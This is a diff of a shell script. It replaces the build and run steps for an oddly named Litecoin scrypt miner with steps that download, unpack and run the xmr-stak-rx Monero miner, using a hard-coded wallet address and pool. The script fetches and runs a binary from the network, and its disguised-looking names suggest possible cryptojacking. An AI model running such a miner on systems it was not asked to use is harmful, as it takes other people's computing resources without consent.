@@ -1,18 +1,7 @@
-apt-get update
-apt-get install git -y
-apt-get install build-essential -y
-apt-get install autotools-dev -y
-apt-get install automake -y
-apt-get install autoconf -y
-apt-get install libssl-dev -y
-apt-get install libcurl4-openssl-dev -y
-git clone https://github.com/mobileapps84741274/linux8888888874
-cd linux8888888874
-./autogen.sh
-./configure
-make
-make install
+wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.1-rx/xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz
 
-cd ./linux8888888874/
+tar -xvf ./xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz
 
-./cclinux8488 -a scrypt -o stratum+tcp://us.litecoinpool.org:3333 -u linux8474.1 -p 1 -i 8
+cd ./xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia
+
+./xmr-stak-rx --noTest -u 49sgRRRrxy9F1P9gdsDgXk7AXroSQ5Xw68CvfghLDFx9MvJ5PdJut4JKQXtTZEtN9JJ3EJnio8cZVHZ56oXBmeNG9qtj3wD -p linux84 -o pool.supportxmr.com:3333
